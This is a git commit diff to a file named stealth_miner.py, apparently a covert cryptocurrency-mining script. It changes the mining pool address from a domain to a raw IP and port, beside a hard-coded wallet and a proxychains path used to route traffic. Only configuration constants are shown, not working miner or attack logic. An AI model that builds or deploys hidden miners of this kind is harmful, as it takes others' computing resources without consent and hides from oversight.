8ae6d85ebe6869ac0863aa263899e9c8746cafee
sagemantap <158444606+sagemantap@users.noreply.github.com>
2025-07-20 09:50:41 +0700

    Update stealth_miner.py

--- stealth_miner.py
+++ stealth_miner.py
@@ -2,7 +2,7 @@
 import subprocess, time, os, signal, random
 
 WALLET = "scash1qssvy8a0lrueh25j2rkzuv2lmsalgaemc6szj52.Danis"
-POOL = "stratum+tcp://satoshicash.cedric-crispin.com:4474"
+POOL = "stratum+tcp://146.59.217.34:17019"
 PROXY = ["./proxychains4"]  # Non-root proxychains dummy path
 
 def start_miner():
